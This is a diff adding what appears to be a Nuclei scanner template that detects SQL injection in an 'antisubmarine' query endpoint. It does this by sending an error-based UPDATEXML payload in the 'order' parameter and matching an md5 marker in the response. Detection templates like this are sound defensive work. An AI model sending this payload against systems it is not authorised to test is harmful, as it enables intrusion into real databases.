@@ -1,0 +1,35 @@
+id: sql-injection-antisubmarine
+
+info:
+  name: SQL Injection in Antisubmarine Query
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for a potential SQL Injection vulnerability in the `/manage/antisubmarine/queryAntisubmarineList.do` endpoint by using a crafted payload to manipulate the SQL query.
+  tags: sqli
+
+http:
+  - raw:
+      - |
+        GET /manage/antisubmarine/queryAntisubmarineList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,md5(123456),0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "~e10adc3949ba59abbe56e057f20f883e~"
+
+    extractors:
+      - type: regex
+        name: sql-injection-result
+        group: 0
+        regex:
+          - "~e10adc3949ba59abbe56e057f20f883e~"
